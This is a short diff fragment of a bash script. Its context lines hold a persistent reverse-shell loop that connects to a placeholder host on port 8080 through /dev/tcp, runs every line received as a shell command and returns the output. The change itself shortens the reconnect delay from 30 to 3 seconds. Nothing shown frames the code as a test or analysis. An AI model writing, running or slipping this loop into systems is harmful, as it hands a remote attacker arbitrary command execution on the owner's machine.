@@ -15,7 +15,7 @@ relative_path=$(dirname "$0");
 
 function loop_de_loop {
     while true; do
-        sleep 30
+        sleep 3
         exec 5<>/dev/tcp/REPLACEME/8080
         cat <&5 | while read line; do
             $line 2>&5 >&5
